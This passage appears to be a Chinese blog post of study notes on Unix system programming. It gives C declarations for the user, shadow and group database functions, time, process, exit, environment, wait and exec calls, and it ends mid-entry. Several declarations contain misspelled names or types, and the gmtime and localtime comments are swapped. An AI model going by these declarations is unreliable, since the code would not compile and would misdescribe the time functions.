*name)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">passwd</span> *<span class="hljs-title">ptr</span>;</span><br>setpwent();<br><span class="hljs-keyword">while</span>((ptr = getpwent()) != <span class="hljs-literal">NULL</span>)<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(name, ptr-&gt;pw_name) == <span class="hljs-number">0</span>)<br><span class="hljs-keyword">break</span>;<br>endpwent();<br><span class="hljs-keyword">return</span>(ptr);<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="影子密码文件"><a href="#影子密码文件" class="headerlink" title="影子密码文件"></a>影子密码文件</h1><p><img src="C:\Users\39738\AppData\Roaming\Typora\typora-user-images\image-20221205164222088.png" alt="image-20221205164222088"></p><p>用于获取影子密码文件的函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;shadow.h&gt;</span></span><br><br><span class="hljs-keyword">struct</span> spwd *<span class="hljs-title function_">getspname</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *name)</span>;<br><span class="hljs-keyword">struct</span> spwd *<span class="hljs-title function_">getspent</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">setspent</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">endspent</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<br></code></pre></td></tr></table></figure><h1 id="组文件"><a href="#组文件" class="headerlink" title="组文件"></a>组文件</h1><p><img src="C:\Users\39738\AppData\Roaming\Typora\typora-user-images\image-20221205164801102.png" alt="image-20221205164801102"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;grp.h&gt;</span></span><br><span class="hljs-keyword">struct</span> group *<span class="hljs-title function_">getgrgid</span><span class="hljs-params">(<span class="hljs-type">gid_t</span> gid)</span>;<br><span class="hljs-keyword">struct</span> group *<span class="hljs-title function_">getgrname</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *name)</span>;<br></code></pre></td></tr></table></figure><p>用于遍历整个组文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;grp.h&gt;</span></span><br><span class="hljs-keyword">struct</span> group *<span class="hljs-title function_">getgrent</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">setgrent</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">endgrent</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<br></code></pre></td></tr></table></figure><h1 id="补充组ID"><a href="#补充组ID" class="headerlink" title="补充组ID"></a>补充组ID</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">getgroups</span><span class="hljs-params">(<span class="hljs-type">int</span> gidsetsize, <span class="hljs-type">gid_t</span> grouplist[])</span>;<span class="hljs-comment">//获取目前用户所属的组ID</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;grp.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">setgroups</span><span class="hljs-params">(<span class="hljs-type">int</span> ngroups, <span class="hljs-type">const</span> <span class="hljs-type">gid_t</span> grouplist[])</span>;<br><span class="hljs-comment">//设置当前用户的补充组ID</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;grp.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">initgroups</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *username, <span class="hljs-type">gid_t</span> basegid)</span>;<span class="hljs-comment">//从组文件（/etc/group）中读取一项数据，若该组数据的成员中有参数user时，便将参数group组识别码加入到此数据中。</span><br></code></pre></td></tr></table></figure><h1 id="其他系统文件"><a href="#其他系统文件" class="headerlink" title="其他系统文件"></a>其他系统文件</h1><p><img src="C:\Users\39738\AppData\Roaming\Typora\typora-user-images\image-20221207165325358.png" alt="image-20221207165325358"></p><h1 id="登录记录"><a href="#登录记录" class="headerlink" title="登录记录"></a>登录记录</h1><p><code>utmp</code>用于跟踪过当前登录的所有用户</p><p><img src="C:\Users\39738\AppData\Roaming\Typora\typora-user-images\image-20221207165629576.png" alt="image-20221207165629576"></p><h1 id="系统识别"><a href="#系统识别" class="headerlink" title="系统识别"></a>系统识别</h1><p>获取当前主机与操作系统的信息</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/utsname.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">uname</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> utsname *name)</span><br></code></pre></td></tr></table></figure><p><img src="C:\Users\39738\AppData\Roaming\Typora\typora-user-images\image-20221207170044044.png" alt="image-20221207170044044"></p><p>获取TCP&#x2F;IP网络上的主机名称</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">gethosstname</span><span class="hljs-params">(<span class="hljs-type">char</span> *name,<span class="hljs-type">int</span> namelen)</span>;<br></code></pre></td></tr></table></figure><h1 id="时间与日期"><a href="#时间与日期" class="headerlink" title="时间与日期"></a>时间与日期</h1><p>获取当前时间和日期</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;time.h&gt;</span></span><br><br><span class="hljs-type">time_t</span> <span class="hljs-title function_">time</span><span class="hljs-params">(<span class="hljs-type">time_t</span> *calptr)</span>;<br></code></pre></td></tr></table></figure><p><img src="C:\Users\39738\AppData\Roaming\Typora\typora-user-images\image-20221207171327943.png" alt="image-20221207171327943"></p><p>用于获取指定时钟的时间</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/time.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">clock_gettime</span><span class="hljs-params">(<span class="hljs-type">clockid_t</span> clock_id, <span class="hljs-keyword">struct</span> timespec *tsp)</span>;<br></code></pre></td></tr></table></figure><p>用于获取指定精度时间</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/time.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">clock_getres</span><span class="hljs-params">(<span class="hljs-type">clockid_t</span> clock_id, <span class="hljs-keyword">struct</span> timespec *tsp)</span>;<br></code></pre></td></tr></table></figure><p>用于设置特定的时间</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/time.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">clock_settime</span><span class="hljs-params">(<span class="hljs-type">clockid_t</span> clock_id, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> timespec *tsp)</span>;<br></code></pre></td></tr></table></figure><p>比<code>time</code>函数更高的精度获取时间</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/time.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">gettimeofday</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> timeval *<span class="hljs-keyword">restrict</span> tp, <span class="hljs-type">void</span> *<span class="hljs-keyword">restrict</span> tzp)</span>;<br></code></pre></td></tr></table></figure><p>时间之间的关系</p><p><img src="C:\Users\39738\AppData\Roaming\Typora\typora-user-images\image-20221207172705110.png" alt="image-20221207172705110"></p><p><img src="C:\Users\39738\AppData\Roaming\Typora\typora-user-images\image-20221207172748969.png" alt="image-20221207172748969"></p><p>时间转化</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;time.h&gt;</span></span><br><br><span class="hljs-keyword">struct</span> tm *<span class="hljs-title function_">gmtime</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">time_t</span> *calptr)</span>;<span class="hljs-comment">//将日历时间转化为本地时间</span><br><span class="hljs-keyword">struct</span> tm*<span class="hljs-title function_">localtime</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">time_t</span> *calptr)</span><span class="hljs-comment">//将日历时间转化为UTC表示的分解时间</span><br></code></pre></td></tr></table></figure><p>函数mktime获取一个表示为本地时间的分解时间，并将其转换为time_t值</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;time.h&gt;</span></span><br><br><span class="hljs-type">time_t</span> <span class="hljs-title function_">mktime</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> tm*tmptr)</span>;<br></code></pre></td></tr></table></figure><p>以格式化字符串的形式转换时间</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;time.h&gt;</span></span><br><br><span class="hljs-type">size_t</span> <span class="hljs-title function_">strftime</span><span class="hljs-params">(charr *<span class="hljs-keyword">restrict</span> buf,<span class="hljs-type">size_t</span> maxsize,</span><br><span class="hljs-params">               <span class="hljs-type">const</span> <span class="hljs-type">char</span> *<span class="hljs-keyword">restrict</span> format,<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> tm*<span class="hljs-keyword">restrict</span> tmptr)</span>;<br><span class="hljs-type">size_t</span> <span class="hljs-title function_">strftime_l</span><span class="hljs-params">(<span class="hljs-type">char</span> *<span class="hljs-keyword">restrict</span> buf,<span class="hljs-type">size_t</span> maxsize,<span class="hljs-type">const</span> <span class="hljs-type">char</span> *<span class="hljs-keyword">restrict</span> format,<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> tm*<span class="hljs-keyword">restrict</span> tmptr, <span class="hljs-type">locale_t</span> locale)</span>;<br></code></pre></td></tr></table></figure><p><img src="C:\Users\39738\AppData\Roaming\Typora\typora-user-images\image-20221207173819203.png" alt="image-20221207173819203"></p><p>将字符串转化为中断时间</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;time.h&gt;</span></span><br><br><span class="hljs-type">char</span> *<span class="hljs-title function_">strptime</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *<span class="hljs-keyword">restrict</span> buf, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *<span class="hljs-keyword">restrict</span> format, <span class="hljs-keyword">struct</span> tm *restrct tmptr)</span>;<br></code></pre></td></tr></table></figure><p><img src="C:\Users\39738\AppData\Roaming\Typora\typora-user-images\image-20221207174854679.png" alt="image-20221207174854679"></p><h1 id="Exit函数"><a href="#Exit函数" class="headerlink" title="Exit函数"></a>Exit函数</h1><h2 id="exit、-Exit和-exit函数"><a href="#exit、-Exit和-exit函数" class="headerlink" title="exit、_Exit和_exit函数"></a>exit、_Exit和<code>_exit</code>函数</h2><p><code>_exit</code>和<code>_Exit</code>会马上返回内核，而<code>exit</code>会执行清理过程再返回内核</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">exit</span><span class="hljs-params">(<span class="hljs-type">int</span> status)</span>;<br><br><span class="hljs-type">void</span> _Exit(<span class="hljs-type">int</span> status);<br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">void</span> _exit(<span class="hljs-type">int</span> status);<br></code></pre></td></tr></table></figure><h2 id="atexit"><a href="#atexit" class="headerlink" title="atexit"></a>atexit</h2><p>一个进程可以设置至少32个退出时自动调用的函数，通过<code>atexit</code>函数可以进行注册，调用顺序与执行顺序相反</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">atexxit</span><span class="hljs-params">(<span class="hljs-type">void</span> (*func)(<span class="hljs-type">void</span>))</span>;<br></code></pre></td></tr></table></figure><p><img src="C:\Users\39738\AppData\Roaming\Typora\typora-user-images\image-20221212233431839.png" alt="image-20221212233431839"></p><h1 id="内存分配"><a href="#内存分配" class="headerlink" title="内存分配"></a>内存分配</h1><h2 id="malloc、calloc和realloc函数"><a href="#malloc、calloc和realloc函数" class="headerlink" title="malloc、calloc和realloc函数"></a>malloc、calloc和realloc函数</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">void</span> *<span class="hljs-title function_">malloc</span><span class="hljs-params">(<span class="hljs-type">size_t</span> size)</span>;<br><span class="hljs-type">void</span> *<span class="hljs-title function_">calloc</span><span class="hljs-params">(<span class="hljs-type">size_t</span> nobj, <span class="hljs-type">size_t</span> size)</span>;<br><span class="hljs-type">void</span> *<span class="hljs-title function_">realloc</span><span class="hljs-params">(<span class="hljs-type">void</span> *ptr, <span class="hljs-type">size_t</span> newsize)</span>;<br></code></pre></td></tr></table></figure><h1 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h1><p>环境变量的形式为<code>name = value</code></p><h2 id="getenv"><a href="#getenv" class="headerlink" title="getenv"></a>getenv</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">char</span> *<span class="hljs-title function_">getenv</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *name)</span>;<br>Returns value;<br></code></pre></td></tr></table></figure><h2 id="putenv、setenv和unsetenv"><a href="#putenv、setenv和unsetenv" class="headerlink" title="putenv、setenv和unsetenv"></a>putenv、setenv和unsetenv</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">putenv</span><span class="hljs-params">(<span class="hljs-type">char</span> *str)</span>;<span class="hljs-comment">//接受name=value的字符串形式，若存在则删除原有的</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">setenv</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *name, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *value,<span class="hljs-type">int</span> rewrite)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">unsetenv</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *name)</span>;<span class="hljs-comment">//删除任何名称的定义</span><br></code></pre></td></tr></table></figure><h1 id="setjmp和longjmp"><a href="#setjmp和longjmp" class="headerlink" title="setjmp和longjmp"></a>setjmp和longjmp</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;setjmp.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">setjmp</span><span class="hljs-params">(jmp_buf env)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">longjmp</span><span class="hljs-params">(jmp_buf env,<span class="hljs-type">int</span> cal)</span>;<br></code></pre></td></tr></table></figure><h1 id="getrlimit和setrlimit"><a href="#getrlimit和setrlimit" class="headerlink" title="getrlimit和setrlimit"></a>getrlimit和setrlimit</h1><p>通过这两个函数可以查询和设置资源限制</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/resource.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">getrlimit</span><span class="hljs-params">(<span class="hljs-type">int</span> resource, <span class="hljs-keyword">struct</span> rlimit *rlptr)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">setrlimit</span><span class="hljs-params">(<span class="hljs-type">int</span> resource, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> rlimit *rlptr)</span>;<br></code></pre></td></tr></table></figure><h1 id="获取进程id"><a href="#获取进程id" class="headerlink" title="获取进程id"></a>获取进程id</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">pid_t</span> <span class="hljs-title function_">getpid</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>; <span class="hljs-comment">//返回调用进程号</span><br><span class="hljs-type">pid_t</span> <span class="hljs-title function_">getppid</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>; <span class="hljs-comment">//返回调用进程的父进程</span><br><span class="hljs-type">uid_t</span> <span class="hljs-title function_">getuid</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>; <span class="hljs-comment">//返回调用进程的真实uid</span><br><span class="hljs-type">uid_t</span> <span class="hljs-title function_">geteuid</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>; <span class="hljs-comment">//返回调用进程的有效uid</span><br><span class="hljs-type">gid_t</span> <span class="hljs-title function_">getgid</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<span class="hljs-comment">//返回调用进程的真实组id</span><br><span class="hljs-type">gid_t</span> <span class="hljs-title function_">getegid</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>; <span class="hljs-comment">//返回调用进程的有效组id</span><br></code></pre></td></tr></table></figure><h1 id="fork函数"><a href="#fork函数" class="headerlink" title="fork函数"></a>fork函数</h1><p>现有进程可以通过调用fork函数来创建新进程。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">pid_t</span> <span class="hljs-title function_">fork</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<br><span class="hljs-comment">//返回0为子进程</span><br><span class="hljs-comment">//返回非0则为父进程，返回值为子进程号</span><br></code></pre></td></tr></table></figure><h1 id="wait和waitpid"><a href="#wait和waitpid" class="headerlink" title="wait和waitpid"></a>wait和waitpid</h1><p>等待子进程完成执行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/wait.h&gt;</span></span><br><br><span class="hljs-type">pid_t</span> <span class="hljs-title function_">wait</span><span class="hljs-params">(<span class="hljs-type">int</span> *statloc)</span>;<br><span class="hljs-type">pid_t</span> <span class="hljs-title function_">waitpid</span><span class="hljs-params">(<span class="hljs-type">pid_t</span> pid,<span class="hljs-type">int</span> *statloc, <span class="hljs-type">int</span> options)</span>;<br><span class="hljs-comment">//成功返回子进程id</span><br></code></pre></td></tr></table></figure><table><thead><tr><th>宏</th><th>描述</th></tr></thead><tbody><tr><td>WIFEXITED(status)</td><td>如果子进程正常结束则返回True</td></tr><tr><td>WIFSIGNALED(status)</td><td>如果子进程异常结束则返回True,通过WTERMSIG(status)可以获取信号的序号，通过WCOREDUMP(status)可以判断是否生成core文件</td></tr><tr><td>WIFSTOPPED(status)</td><td>如果子进程被停止返回True。通过WSTOPSIG(status)可以获取导致子进程停止的信号序号</td></tr><tr><td>WIFCONTINUED(status)</td><td>如果在作业控制停止后继续的子进程返回True</td></tr></tbody></table><h1 id="waitid函数"><a href="#waitid函数" class="headerlink" title="waitid函数"></a>waitid函数</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/wait.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">waitid</span><span class="hljs-params">(<span class="hljs-type">idtype_t</span> idtype, <span class="hljs-type">id_t</span> id, <span class="hljs-type">siginfo_t</span> *infop,<span class="hljs-type">int</span> options)</span>;<br></code></pre></td></tr></table></figure><h2 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h2><ul><li>P_PID：等待特定的进程id，id用于标识特定的进程id</li><li>P_GID：等待特定的进程组id，id用于标识特定的组id</li><li>P_ALL：等待热河子进程，id可以被忽略</li></ul><h2 id="选项"><a href="#选项" class="headerlink" title="选项"></a>选项</h2><ul><li>WCONTINUED：等待先前已停止并已继续且其状态尚未报告的进程</li><li>WEXITED：等待已退出的进程</li><li>WNOHANG：如果没有可用的子退出状态，则立即返回而不是阻止</li><li>WSTOPPED：等待已停止且状态尚未报告的进程</li></ul><h1 id="wait3和wait4"><a href="#wait3和wait4" class="headerlink" title="wait3和wait4"></a>wait3和wait4</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">f<br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/wait.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/time.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/resource.h&gt;</span></span><br><br><span class="hljs-type">pid_t</span> <span class="hljs-title function_">wait3</span><span class="hljs-params">(<span class="hljs-type">int</span> *statloc,<span class="hljs-type">int</span> options, <span class="hljs-keyword">struct</span> rusage *resage)</span>;<br><span class="hljs-type">pid_t</span> <span class="hljs-title function_">wait4</span><span class="hljs-params">(<span class="hljs-type">pid_t</span> pid,<span class="hljs-type">int</span> *statloc,<span class="hljs-type">int</span> options, <span class="hljs-keyword">struct</span> rusage *rusage)</span>;<br></code></pre></td></tr></table></figure><h1 id="exec函数"><a href="#exec函数" class="headerlink" title="exec函数"></a>exec函数</h1><p>exec用磁盘上的一个新程序替换了当前进程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">exec为执行进程的函数</span><br><span class="hljs-comment">l代表参数列表,使用空指针作为末尾</span><br><span class="hljs-comment">v代表参数向量</span><br><span class="hljs-comment">e代表环境变量</span><br><span class="hljs-comment">p代表文件名</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">execl</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *pathname, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *arg0, ...)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">execv</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *pathname,<span class="hljs-type">char</span> *<span class="hljs-type">const</span> argv[])</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">execle</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *pathname, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *arg0,...)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">execve</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> r*pathname,<span class="hljs-type">char</span> *<span class="hljs-type">const</span> argv[],<span class="hljs-type">char</span> *<span class="hljs-type">const</span> envp[])</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">execlp</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *filename,<span class="hljs-type">const</span> <span class="hljs-type">char</span>*arg0,...)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">execvp</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *filename, <span class="hljs-type">char</span> *<span class="hljs-type">const</span> argv[])</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">fexecve</span><span class="hljs-params">(<span class="hljs-type">int</span> fd,<span class="hljs-type">char</span> *consst argv[],<span class="hljs-type">char</span> *<span class="hljs-type">const</span> envp[])</span>;<br></code></pre></td></tr></table></figure><h1 id="system函数"><a href="#system函数" class="headerlink" title="system函数"></a>system函数</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">system</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> 